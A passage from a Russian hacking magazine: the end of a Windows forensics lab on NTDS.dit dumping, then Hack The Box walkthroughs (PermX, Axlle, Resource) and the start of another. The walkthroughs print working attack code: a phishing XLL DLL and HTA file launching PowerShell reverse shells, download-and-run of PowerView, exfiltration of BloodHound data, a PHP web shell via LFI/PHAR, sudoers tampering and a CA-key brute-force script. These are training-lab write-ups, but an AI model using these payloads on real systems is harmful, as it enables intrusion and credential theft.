SYSTEM, хранящий в себе параметры конфигурации как установленных при‐
ложений, так и операционной системы. С точки зрения криминалистики кусты
реестра имеют достаточно большое значение, поскольку они дают под‐
робную информацию о том, что атака была успешно проведена.


CrownJewel-2
В этой лабораторной работе нам предоставлены журналы системы, приложе‐
ний и безопасности, что позволяет рассмотреть второй вариант проведения
атаки Credential Dumping NTDS.dit, основанный на использовании утилиты
NTDSUTIL.exe.
   NTDSUTIL — это встроенный инструмент для управления NTDS на сер‐
верах Windows, но злоумышленник может использовать ее для получения
доступа к этой базе данных. Нам необходимо отслеживать события с иден‐
тификаторами 325 и 327 и источником событий ESENT в APPLICATION.evtx.
Эти события регистрируются при создании новой базы данных и отсоеди‐
нении другой соответственно.
  Мы также будем искать событие с идентификатором 7036 в SYSTEM.evtx
для корреляции с нашими результатами поиска в журналах приложений.
Наконец, мы рассмотрим событие с идентификатором 4799 в SECURITY.
evtx. Давай начнем с журналов приложений. Просмотрим события с Event
ID 325, 327 и источником событий ESENT.
   ESENT — это встраиваемый и транзакционный движок СУБД, позволяющий
создавать  пользовательские  приложения, которым  требуется  надежное
высокопроизводительное хранилище данных с минимальными затратами.





C помощью показанного выше фильтра выведем список всех операций
с базой данных, связанных с AD. При просмотре событий с идентификатором
325 важным будет поиск любого необычного пути к файлу с новой созданной
копией NTDS.dit, кроме %SystemRoot%\ntds\.





Сразу после этого события идeт следующее с ID 327, сообщающее о том,
что база данных по тому же пути отключена.





В SYSTEM.evtx в промежутке времени, когда происходили просмотренные
нами ранее события, можно заметить запуск двух служб, связанных с Event
ID 7036 и с созданием теневой копии тома.





Журнал SECURITY.evtx будет интересен событиями с идентификатором
4799, в которых, как в предыдущей лабораторной работе, будут перечислять‐
ся локальные группы безопасности, причем этих событий будет множество.





На этот раз важными индикаторами событий будут следующие:
 • перечисление групп администраторов и операторов резервного копиро‐
   вания (Administrators, Backup Operators);
 • имя процесса: ntdsutil.exe.


Меры предупреждения
Организациям следует предпринять меры для защиты административного
доступа к контроллеру домена и отслеживать активность учетных записей
администраторов на предмет подозрительных действий. Рассмотри воз‐
можность использовать систему управления паролями локальных админис‐
траторов (LAPS), которая обеспечивает безопасность доступа.
   Кроме того, стоит принять меры для предотвращения атак с исполь‐
зованием инъекций кода, которые могут привести к утечке учетных данных.
Для  этого настрой дополнительные параметры безопасности через LSA
(Local Security Authority).


ВЫВОДЫ

В статье были рассмотрены две популярные атаки на Active Directory, а также
их индикаторы компрометации, используемые злоумышленниками утилиты,
методы и средства реагирования.
ВЗЛОМ





Сегодня я покажу, как использовать коман‐
ду  setfacl, чтобы закрепиться на машине
с Linux и повысить привилегии. Но сначала
нам надо будет получить к ней доступ. Сде‐
лаем мы это при помощи бага в системе             RalfHacker                                                                                             hackerralf8@gmail.com
Chamilo,  а  для  перехода  в  контекст
безопасности  пользователя  разберемся
с веб‑приложением и получим учетные дан‐
ные.


Наша цель — получение прав суперпользователя на машине PermX с учебной
площадки Hack The Box. Уровень задания — легкий.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                            только через VPN. Не делай этого с компьютеров,
                        где есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА

Сканирование портов
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.23    permx.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A).





                             Результат работы скрипта

Скрипт нашел два открытых порта:
 • 22 — служба OpenSSH 8.9p1;
 • 80 — веб‑сервер Apache 2.4.52.

Первым делом идем осматриваться на сайте.





                           Главная страница сайта


ТОЧКА ВХОДА

Ничего интересного найти не удалось, поэтому приступим к сканированию.

Справка: сканирование веба c feroxbuster
Одно из первых действий при тестировании безопасности веб‑приложе‐
ния — это сканирование методом перебора каталогов, чтобы найти скрытую
информацию и недоступные обычным посетителям функции. Для этого можно
использовать программы вроде dirsearch, DIRB или  ffuf. Я предпочитаю
feroxbuster.
  При запуске указываем следующие параметры:
 • -u — URL;
 • -w — словарь (я использую словари из набора SecLists);
 • -t — количество потоков;
 • -d — глубина сканирования.



Запускаем feroxbuster и задаем все параметры:


feroxbuster -u http://permx.htb/ -w directory_2.3_medium_lowercase.
txt -d 1 -t 128





                        Результат сканирования каталогов

Ничего интересного не обнаружено, однако мы знаем реальный домен —
permx.htb. Давай просканируем поддомены с помощью ffuf. При запуске
используем следующие параметры:
 • -w — словарь (тот же);
 • -t — количество потоков;
 • -u — URL;
 • -H — HTTP-заголовок.

Место перебора помечается словом FUZZ.


ffuf -u http://permx.htb -H 'Host: FUZZ.permx.htb' -w subdomains-
bitquark-top100000.txt -t 128





                       Результат сканирования поддоменов

В вывод сканера попадают все варианты из словаря, поэтому установим
фильтр по коду ответа (параметр -mc). Нас интересуют только варианты
с кодом ответа 200.


ffuf -u http://permx.htb -H 'Host: FUZZ.permx.htb' -w subdomains-
bitquark-top100000.txt -t 128 -mc 200




                       Результат сканирования поддоменов

Находим два новых поддомена, поэтому обновляем /etc/hosts.


10.10.11.23 permx.htb www.permx.htb lms.permx.htb

Теперь посмотрим новые сайты. На www.permx.htb получаем тот же лендинг,
а на lms.permx.htb нас встречает форма авторизации Chamilo LMS.





                    Главная страница сайта lms.permx.htb

Учетные данные вроде admin:admin не прошли, попробуем найти другой
вариант.


ТОЧКА ОПОРЫ

Первым делом стоит проверить, есть ли для обнаруженной системы готовые
эксплоиты. Для этого чаще всего достаточно поискать в Google.





                         Поиск эксплоитов в Google

Почти все первые ссылки указывают на уязвимость CVE-2023-4220. Chamilo
LMS версии v1.11.24 и ниже позволяет без аутентификации загружать файлы
через следующий эндпоинт:


/main/inc/lib/javascript/bigupload/inc/bigUpload.php

Это можно использовать: загрузить веб‑шелл и получить удаленное выпол‐
нение кода. Все это уже реализовано в эксплоите, который также может
определить наличие уязвимости.


python3 main.py -u http://lms.permx.htb -a scan



                     Определение наличия уязвимости

Так как мы будем ловить реверс‑шелл, то предварительно активируем лис‐
тенер:


pwncat-cs -lp 4321

Теперь выполняем эксплоит.


python3 main.py -u http://lms.permx.htb -a revshell





                              Настройка эксплоита





                         Результат выполнения эксплоита

Эксплоит отработал, а в листенере появилась сессия пользователя www-
data.





                      Сессия пользователя www-data


ПРОДВИЖЕНИЕ

Так как мы работаем в контексте учетной записи веб‑сервера, а на хосте раз‐
вернуто веб‑приложение, самое время поискать учетные данные. Обычно
приложения используют какую‑нибудь базу данных, а учетные данные для нее
хранятся в переменных окружения или файлах с настройками. Переменные
окружения  ничего  интересного  не  содержат,  поэтому  найдем  файл
по наличию в нем строки, например dp_password.


grep -iR db_password ./





                            Результат поиска подстроки

Находим файл app/config/configuration.php, в котором хранятся все нас‐
тройки веб‑приложения.





                   Содержимое файла configuration.php

Поиск учетных данных в самой базе ничего не дал, однако нередки случаи
использования одного пароля в разных сервисах. Возможно, он подойдет
и для какого‑то пользователя. Получить пользователей с активной консолью
можно из файла /etc/passwd.


cat /etc/passwd | grep bash



                     Содержимое файла /etc/passwd

Авторизуемся под пользователем mtz и забираем первый флаг.





                       Флаг пользователя


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ

Теперь нам необходимо собрать информацию. Я рекомендую использовать
для этого скрипты PEASS.

Справка: скрипты PEASS
Что делать после того, как мы получили доступ в систему от имени поль‐
зователя? Вариантов дальнейшей эксплуатации и повышения привилегий
может быть очень много, как в Linux, так и в Windows. Чтобы собрать
информацию и наметить цели, можно  использовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скриптов, которые проверяют сис‐
тему на автомате и выдают подробный отчет о потенциально интересных
файлах, процессах и настройках.


Загрузим на удаленный хост скрипт для Linux, дадим право на выполнение
и запустим сканирование. В выводе будет много информации, но из зна‐
чимой только настройки sudoers.





                               Настройки sudoers

Таким образом, текущий пользователь может выполнить скрипт /opt/acl.sh
от имени пользователя root без ввода пароля. Просмотрим исходный код /
opt/acl.sh.





                      Содержимое файла /opt/acl.sh

Самой последней командой в привилегированном режиме выполняется файл
setfacl, а для него есть техника GTFOBins.


Справка: GTFOBins
GTFOBins —  это  подборка  способов  злоупотреблять  возможностями
популярных программ для Unix. Используя собранные здесь рецепты, можно
быстро получить  доступ  к командным  оболочкам, повысить  привилегии
или передать файлы при помощи легитимных приложений.





                   Описания GTFOBins для /opt/acl.sh

Мы можем установить право записи для любого файла в системе. Так, новая
строчка mtz  ALL=(ALL:ALL)  ALL в файле /etc/sudoers позволит нам
выполнить через sudo любую команду.


Справка: sudoers
Файл /etc/sudoers в Linux содержит списки команд, которые разные группы
пользователей могут выполнять от имени администратора системы. Можно
просмотреть его как напрямую, так и при помощи команды sudo -l.



Первым делом дадим пользователю mtz все права на файл /etc/sudoers.
Чтобы обойти ограничения в скрипте /opt/acl.sh, будем использовать
ссылку.


ln -s /etc/sudoers ./sudoers
sudo /opt/acl.sh mtz rwx /home/mtz/sudoers

Теперь можно дополнить этот файл.


echo "mtz ALL=(ALL:ALL) ALL" >> /home/mtz/sudoers





                               Эксплуатация техники

А теперь просто меняем пользователя на root и читаем второй флаг.





                           Флаг рута

Машина захвачена!
ВЗЛОМ





В этой статье я покажу, как повысить при‐
вилегии в Windows при помощи техники
LOLBins,    на    примере    программы
StandaloneRunner. Но прежде мы получим
сессию через фишинг с  нагрузкой  XLL,             RalfHacker                                                                                             hackerralf8@gmail.com
а затем изменим контекст безопасности
через подмену файла.


Наша цель — получение прав суперпользователя на машине Axlle с учебной
площадки Hack The Box. Уровень задания — сложный.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                            только через VPN. Не делай этого с компьютеров,
                        где есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА

Сканирование портов
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.21    axlle.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A).





                             Результат работы скрипта

Сканер нашел множество открытых портов:
 • 80 (HTTP) — веб‑сервер Microsoft IIS/10.0;
 • 88 — Kerberos;
 • 135 — Microsoft RPC;
 • 139 — служба сеансов NetBIOS, NetLogon;
 • 389 — LDAP;
 • 445 — SMB;
 • 464 — служба смены пароля Kerberos;
 • 593 (HTTP-RPC-EPMAP) — используется в службах DCOM и MS Exchange;
 • 636 — LDAP с шифрованием SSL или TLS;
 • 3268 (LDAP) — для доступа к Global Catalog от клиента к контроллеру;
 • 3269 (LDAPS) — для доступа к Global Catalog от клиента к контроллеру
   через защищенное соединение;
 • 5985 — служба удаленного управления WinRM.

SMB ничего не возвращает, а чтобы попытаться войти на почтовый сервер,
хорошо бы найти почты. Так что для начала давай посмотрим на сайт.





                           Главная страница сайта


ТОЧКА ОПОРЫ

На главной странице находим сообщение, что есть возможность отправить
файл в формате Excel на адрес accounts@axlle.htb. Также в сообщении
указано, что выполнение макросов отключено.





                          Страница сайта About

Хоть макросы и заблокированы, Excel все равно позволяет выполнить код —
при открытии специальной библиотеки Excel DLL в формате XLL. Напишем
код такой библиотеки, который будет запускать реверс‑шелл на PowerShell.
Сгенерировать его можно на сайте revshells.com.


#include <windows.h>


__declspec(dllexport) void __cdecl xlAutoOpen(void);


void __cdecl xlAutoOpen() {
   WinExec("powershell -e JABjAGwA....ApAA==", 1);
}


BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call,
LPVOID lpReserved )
{
   switch (ul_reason_for_call)
   {
   case DLL_PROCESS_ATTACH:
   case DLL_THREAD_ATTACH:
   case DLL_THREAD_DETACH:
   case DLL_PROCESS_DETACH:
       break;
   }
   return TRUE;
}

Запустим листенер:


nc -nlvp 4321

А теперь скомпилируем библиотеку и отправим на найденный почтовый
адрес как вложение.


x86_64-w64-mingw32-gcc -shared -luser32 -o xll.xll xll.c


swaks --server 10.10.11.21 --to accounts@axlle.htb --from ralf@ralf.
com --body "test" --header "Subject: Test" --attach @xll.xll





                         Отправка сообщения с файлом

Спустя несколько секунд в окне листенера появляется шелл пользователя
gideon.hamill.





                           Сессия пользователя




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
          HTB AXLLE
       ПОВЫШАЕМ ПРИВИЛЕГИИ ЧЕРЕЗ
                  STANDALONERUNNER





ПРОДВИЖЕНИЕ

Первым делом проверяем группы и привилегии пользователя.





                       Информация о пользователе

Отметим доменную группу Employees, только пока неясно, для чего она нуж‐
на. Также осмотрим папки на диске C. Там есть стандартный каталог веб‑сер‐
вера. Это может помочь нам повысить привилегии.





                          Содержимое диска C

Из каталога Users мы можем получить список пользователей, которые
заходили на сервер.





                       Содержимое каталога Users

Также не помешает узнать, какой софт установлен не сервере. Сделать
это можно вот такой командой:


Get-ChildItem "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\
CurrentVersion\Uninstall" | Get-ItemProperty | Where-Object {$_.
DisplayName -ne $null} | Select-Object DisplayName, DisplayVersion,
Publisher, InstallDate





                         Установленные приложения

Первой строкой указан hMailServer 5.6.8. Так как больше ничего интерес‐
ного нет, перейдем в каталог этой службы и просмотрим конфиги, логи и тому
подобные кладези информации.





                      Содержимое каталога службы

В каталоге службы есть директория пользователя dallon.matrix. В ней
находим файл EML с сообщениями электронной почты.





                   Содержимое каталога пользователя





                        Содержимое сообщения

В сообщении говорится, что группа WebDev занимается автоматизацией
добавления адресов на сайт и для теста можно разместить ярлык в каталоге
C:\inetpub\testing. Давай подготовим файл 1.url, который будет ука‐
зывать на файл HTA на нашем сервере.


[InternetShortcut]
URL=file://10.10.16.14/test/shell.hta

Сам файл HTA будет просто выполнять реверс‑шелл.


<html>
<head>
<HTA:APPLICATION ID="shell">
<script language="javascript">
       var c = "powershell -e JABjAGwAaQBlAG4AdAAg.....KAApAA==";
       new ActiveXObject('WScript.Shell').Run(c, 0, true);
</script>
</head>
<body>
<script>self.close();</script>
</body>
</html>

Прежде чем размещать ярлык, запускаем новый листенер, куда прилетит
реверс‑шелл,  а  также  активируем  сервер SMB  с помощью  скрипта
smbserver.py.


sudo smbserver.py  -smb2support test .

Спустя несколько секунд увидим обращение к нашему веб‑серверу, а затем
и новую сессию в листенере.





                               Логи SMB-сервера





                     Сессия пользователя dallon.matrix

У нового пользователя находим первый флаг.





                       Флаг пользователя


Пользователь jacob.greeny
Сразу посмотрим все группы и привилегии пользователя.





                       Информация о пользователе

Пользователь состоит в группе Web Devs. Соберем базу BloodHound, чтобы
проанализировать списки доступа.

Справка: BloodHound
Утилита BloodHound использует теорию графов для выявления скрытых
и зачастую непреднамеренных взаимосвязей в среде Active Directory. Ее мож‐
но использовать, чтобы легко идентифицировать очень сложные пути атаки.
Помимо самой утилиты, которая позволяет просматривать граф, существует
часть, загружаемая на удаленный хост для сбора информации. Она бывает
в версиях для Windows — на PowerShell или C# — и для Linux — на Python.



SharpHound.exe -c All





                    Сбор базы BloodHound

Осталось скачать файл с удаленной машины. Для этого я на своем хосте
запустил свой веб‑сервер с возможностью загрузки файла, после чего через
PowerShell загрузил файл.


$wc=New-Object System.Net.WebClient; $resp=$wc.UploadFile('http://10.
10.16.14:8000/',"C:\Windows\Tasks\20240818043727_BloodHound.zip")

Теперь выбираем подконтрольного пользователя и строим граф Outbound.





                       Граф BloodHound

Видим, что пользователь dallon.matrix состоит в группе Web Devs, которая
имеет право менять пароль двух учетных записей. Пользователи идентичны,
поэтому дальше можно работать от лица любого из них, например JACOB.
GREENY. Загрузим и выполним скрипт PowerView.ps1, а затем установим поль‐
зователю новый пароль.


IEX ((new-object net.webclient).downloadstring('http://10.10.16.14:
8000/PowerView4.ps1'))
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText
-Force
Set-DomainUserPassword -Identity JACOB.GREENY -AccountPassword
$UserPassword

Теперь с помощью утилиты NetExec проверяем, установлен ли пароль.


nxc smb 10.10.11.21 -u JACOB.GREENY -p 'Password123!'



                           Проверка учетных данных


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ

Новый пользователь состоит в группе Windows Remote Manager, поэтому
можно зайти по WinRM. Сразу проверим локальные группы и привилегии.


evil-winrm -i 10.10.11.21 -u JACOB.GREENY -p 'Password123!'





                       Информация о пользователе

Пользователь состоит в группе App Devs, а на диске был каталог App
Development. Проверим права доступа к этому каталогу.


icacls "App Development"





                          Права доступа к каталогу

У группы App Devs есть права чтения и выполнения в этом каталоге. Внутри
найдем проект kbfiltr.





                       Содержимое каталога kbfiltr

Из файла README.md можно узнать об автоматическом тестировании при‐
ложения с помощью  StandaloneRunner. При этом запуск  производится
от имени SYSTEM.





                     Содержимое файла README.md

StandaloneRunner — это  утилита, которая входит в комплект драйверов
Windows (WDK) и  используется для тестирования и отладки драйверов
в Windows. Она позволяет разработчикам выполнять и отлаживать пакеты
драйверов в автономной среде без необходимости устанавливать их в сис‐
тему. Для StandaloneRunner есть техника LOLBins, которая приведет к выпол‐
нению кода в контексте приложения.

Справка: LOLBins
LOLBins (Living Off the Land Binaries) — это техника использования легитимных
системных или предустановленных программ (бинарных файлов) для выпол‐
нения произвольного кода или эскалации прав в системе. Среди таких инс‐
трументов — powershell.exe, mshta.exe и regsvr32.exe.



Последуем PoC и воссоздадим структуру каталогов.


mkdir myTestDir
mkdir myTestDir\working
echo > myTestDir\working\rsf.rsf

Теперь в файл command.txt запишем команду для выполнения реверс‑шел‐
ла. В reboot.rsf зададим следующие настройки.


myTestDir
True

Так как писать в файлы из сессии WinRM не очень удобно, можно заполнить
их на своей системе, а затем загрузить на сервер.





                              Эксплуатация LOLBins

Запускаем листенер и копируем все файлы в каталог StandaloneTesting.


cp -r .\* "C:\Program Files (x86)\Windows Kits\10\Testing\S
tandaloneTesting\Internal\x64"





                 Содержимое каталога StandaloneTesting

Тест делается раз в минуту, поэтому очень скоро в листенере получим сес‐
сию от имени SYSTEM.




                           Флаг рута

Машина захвачена!
ВЗЛОМ





Сегодня я покажу, как получив корневой
сертификат,      подписать     SSH-ключ
и повысить  привилегии. При  эскалации
привилегий проэксплуатируем уязвимость
в  пользовательском  скрипте  на  Bash.             RalfHacker                                                                                             hackerralf8@gmail.com
Но первым делом нам понадобится ата‐
ковать  сайт — мы  получим  удаленное
выполнение кода через связку LFI и PHAR
upload.


Наша цель — получение прав суперпользователя на машине Resource с учеб‐
ной площадки Hack The Box. Уровень ее сложности — «средняя».


РАЗВЕДКА

Сканирование портов
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.27 resource.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A).





                             Результат работы скрипта

Сканер нашел три открытых порта:
 • 22 — служба OpenSSH 9.2p1;
 • 80 — веб‑сервер Nginx 1.18.0;
 • 2222 — служба OpenSSH 8.9p1.

На порте 80 выполняется редирект на адрес http://itrc.ssg.htb, поэтому
обновим запись в файле /etc/hosts, а затем просмотрим сайт через бра‐
узер.


10.10.11.27 resource.htb itrc.ssg.htb





                           Главная страница сайта


ТОЧКА ВХОДА

На сайте есть возможность регистрации и авторизации. Сделаем это, так
как авторизованному пользователю обычно доступно больше функций, а зна‐
чит и точек для атаки будет больше.





              Главная страница авторизованного пользователя

На странице dashboard есть возможность заводить тикеты и загружать ZIP-
архивы. Так как на сайте индекс файл представлен в формате PHP, попробуем
найти   другие  PHP-файлы.  Для   этого  будем  использовать   утилиту
feroxbuster .


Справка: сканирование веба c feroxbuster
Одно из первых действий при тестировании безопасности веб‑приложе‐
ния — это сканирование методом перебора каталогов с целью поиска скры‐
той информации и недоступной обычным посетителям функций. Для этого
можно использовать программы вроде dirsearch, dirb или ffuf. Я предпочитаю
feroxbuster.
  При запуске используем следующие параметры:
 • -u — URL;
 • -w — словарь (я использую словари из набора Seclists);
 • -t — количество потоков;
 • -d — глубина сканирования.



Задаем все параметры и запускаем сканирование:


feroxbuster -u http://itrc.ssg.htb/ -w php_files_common_5476.txt -x
php -d 1 -t 128





             Результат сканирования файлов с помощью feroxbuster

Находим много новых интересных файлов. Что примечательно, среди них
присутствует dashboard.php, а мы получали доступ к странице через index.
php?page=dashboard. Видимо, к параметру page автоматически добавляется
расширение php. Попробуем таким же образом просмотреть  страницу
admin.php.





                      Содержимое страницы admin

Получаем содержимое страницы и пробуем тем же способом просмотреть
и другие. При обращении к /api/login.php видим ошибку, раскрывающую
путь к файлам на сервере.





                   Ошибка при загрузке /api/login.php


ТОЧКА ОПОРЫ

Перейдем к созданию тикета. Во вложении загрузим рандомный ZIP-архив.





                            Создание тикета

Тикет появится в общем списке. По кнопке Open просмотрим его содер‐
жимое.





                              Список тикетов





                          Информация о тикете

Нам доступен для скачивания загруженный тестовый архив. По ссылке видно,
что он хранится в каталоге uploads с измененным именем.



                             Ссылка на архив.

Это значит, что у нас есть возможность эксплуатировать LFI, но работает она
только для файлов PHP, а также мы знаем куда сохраняются ZIP-архивы.
Можем попробовать реализовать следующий сценарий: на сервер загрузим
архив с шеллом на PHP, а затем обратимся через LFI к файлу внутри архива
через путь phar://.
   Заархивируем файл shell.php, загрузим архив на сервер и получим путь
к нему на сервере.


<?php system($_GET['cmd']); ?>





                             Загруженный архив

Осталось обратиться к шеллу и в качестве теста выполнить команду id.


http://itrc.ssg.htb/?page=phar://uploads/
450373bf3fff7e53023e6b2736add325cd51e3bb.zip/shell&cmd=id





                         Результат выполнения команды id

Команда выполнена, а значит, у нас есть RCE. Запускаем листенер pwncat-
cs -lp 4321 и выполняем реверс‑шелл.



                      Сессия пользователя www-data

‌


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
      HTB RESOURCE
                РАЗБИРАЕМСЯ С SSH-
        АВТОРИЗАЦИЕЙ ПО СЕРТИФИКАТУ





ПОБЕГ ИЗ DOCKER

Пользователь msainristil
На хосте развернуто веб‑приложение, и оно наверняка использует базу дан‐
ных. В таких случаях в базе можно найти учетные данные для сайта, которые
могут пригодиться для дальнейшего проникновения. Данные для подклю‐
чения к самой базе обычно находятся в коде или настройках веб‑приложения.
  В данном случае учетку для базы находим в файле db.php.





                       Содержимое файла db.php

Использовать этот пароль нигде не получилось, поэтому осмотримся на сер‐
вере. Помимо загруженных нами архивов в каталоге uploads можно найти
и вложения к тикетам других пользователей. Скачиваем их на свою машину
для анализа.





                     Загрузка архивов из каталога uploads

Два архива содержат публичные ключи SSH, а в оставшемся находим файл
HAR.





                          Содержимое архивов

В файлах HAR фиксируются разные неполадки браузера, такие как неудачные
входы и проблемы с отображением веб‑страниц. Сразу же ищем в файле
встроки вроде user, pass, token и тому подобные. И находим учетные дан‐
ные, сохраненные в открытом виде.





                         Содержимое файла HAR

С полученными учетными подключаемся по SSH от имени пользователя
msainristill.



                         Пользователь msainristill


Пользователь root
В домашнем каталоге пользователя root есть каталог decommission_old_ca
с ключами центра сертификации.



                Содержимое каталога decommission_old_ca

Закрытый ключ центра сертификации ca-itrc используются для подписи
сертификатов. Публичный ключ ca-itrc.pub используется для проверки под‐
писи сертификатов. Мы можем использовать закрытый ключ центра сер‐
тификации для создания и подписи SSH-сертификата для любого логина.
С помощью созданного сертификата можно будет получить доступ по SSH
от имени пользователя с указанным в сертификате логином.
   Первым делом сгенерируем пару SSH ключей.


ssh-keygen -t rsa -b 2048 -f ralf





                         Генерация пары SSH ключей

Теперь с помощью ключей центра сертификации на основе публичного SSH
ключа ralf.pub сделаем сертификат SSH для логина root. Сразу можно про‐
верить новый сертификат ralf-cert.pub.


ssh-keygen -s ca-itrc -I ca-itrc.pub -n root ralf.pub



                       Создание SSH сертификата


ssh-keygen -Lf ralf-cert.pub





                      Информация из сертификата

Со сгенерированным сертификатом SSH сертификат и закрытым ключом
пользователя получаем доступ от имени root.


ssh -o CertificateFile=ralf-cert.pub -i ralf root@localhost

‌




                       Флаг пользователя


Пользователь support
В домашнем каталоге пользователя zzinter есть скрипт sign_key_api.sh.





              Содержимое домашнего каталога пользователя

Проанализируем его. Скрипт принимает в качестве параметров публичный
ключ, имя пользователя и принципал, возможные значения которого можно
увидеть в справке (help).
  В самой последней строке при помощи утилты curl выполняется запрос
по адресу signserv.ssg.htb/v1/sign, в котором передаются указанные
пользователем данные.





                    Содержимое файла sign_key_api.sh

Добавим новый адрес в файл /etc/hosts.


10.10.11.27 resource.htb itrc.ssg.htb signserv.ssg.htb ssg.htb

Теперь создадим пару ключей SSH, после чего выполним запрос к серверу,
где передадим ключ, а также имя и принципал support. В ответ получаем
сертификат SSH.


ssh-keygen -t rsa -b 2048 -f support


curl -s signserv.ssg.htb/v1/sign -d '{"pubkey": "ssh-rsa AAAAB3.....
", "username": "support", "principals": "support"}' -H
"Content-Type: application/json" -H "Authorization:Bearer
7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE"



                            Получение сертификата

С помощью полученного сертификата и сгенерированного ранее приватного
ключа SSH подключаемся к серверу от имени support.


ssh -o CertificateFile=support-cert.pub -i support support@ssg.htb -p
 2222



                       Сессия пользователя support


ПРОДВИЖЕНИЕ

Давай заглянем в конфиг SSH и просмотрим принципалы для разных поль‐
зователей в каталоге /etc/ssh/auth_principals.




                   Содержимое каталога auth_principals

Нас интересует пользователь zzinter. Его принципал записан в соответству‐
ющий файл.


                     Принципал пользователя zzinter

Заново выполняем запрос, чтобы получить SSH-сертификат, но уже для поль‐
зователя zzinter с принципалом zzinter_temp, и подключаемся к серверу.


curl -s signserv.ssg.htb/v1/sign -d '{"pubkey": "ssh-rsa AAAAB3.....
", "username": "zzinter", "principals": "zzinter_temp"}' -H
"Content-Type: application/json" -H "Authorization:Bearer
7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE"


ssh -o CertificateFile=zzinter-cert.pub -i support zzinter@ssg.htb -p
 2222



                        Сессия пользователя zzinter


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ

Нам нужно повысить привилегии в системе. В Linux есть множество мест,
которые можно проверить с этой целью, но одно из самых очевидных — нас‐
тройки sudoers. Посмотрим их:


sudo -l





                               Настройки sudoers


Справка: sudoers
Файл /etc/sudoers в Linux содержит списки команд, которые разные группы
пользователей могут выполнять от имени администратора системы. Можно
просмотреть его как напрямую, так и при помощи команды sudo -l.



Судя по записи в sudoers, мы можем выполнить скрипт /opt/sign_key.sh
от имени пользователя root без ввода пароля. Просмотрим исходный код.





                   Содержимое файла /opt/sign_key.sh

Скрипт  принимает в  качестве параметров сертификат, публичный ключ
для подписи, имя пользователя, его принципал и серийник. Обрати вни‐
мание, что если сертификат совпадает с сертификатом центра сертификации
/etc/ssh/ca-it, то скрипт вернет ошибку: «Use API for signing with tihs CA».
  При таком сравнении содержимого, переданного сертификата и сер‐
тификата CA, мы можем использовать символ *, который будет означать
«любое количество любых символов». А значит, мы сможем посимвольно
подобрать содержимое сертификата CA. Для автоматизации используем
следующий скрипт.


import subprocess


chars = "
ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=- \n
"
ssh_key = ""


while True:
    for c in chars:
        key = ssh_key + str(c) + "*"
        with open("rkey", "w") as f:
            f.write(key)


        p = subprocess.run( f"sudo /opt/sign_key.sh rkey root.pub
root root 123", shell=True, stdout=subprocess.PIPE, text=True )
        if 'Use API for signing with this CA' in p.stdout:
            ssh_key += c
            print(ssh_key)
            break
    else:
        break


print(ssh_key)





                             Результат работы скрипта

Спустя несколько минут мы получаем сертификат центра сертификации,
который теперь можно использовать для подписи SSH-ключа рута. Но для
этого нам нужен принципал для учетки root.


                            Принципал root

Теперь подписываем публичный ключ, подключаемся по SSH и читаем флаг
рута.


ssh-keygen -t rsa -b 2048 -f root
ssh-keygen -s rkey -I root -V -1w:forever -n root_user -z 123 root.
pub



                             Подпись ключа


ssh root@localhost -p 2222 -i root




                           Флаг рута

Машина захвачена!
ВЗЛОМ





Сегодня я покажу, как может выглядеть ата‐
ка на сайт на платформе Blazor. Мы сге‐
нерируем  токен  JWT   администратора,
затем  через  SQL-инъекцию  в MS SQL
получим сессию на сервере. И под конец             RalfHacker                                                                                             hackerralf8@gmail.com
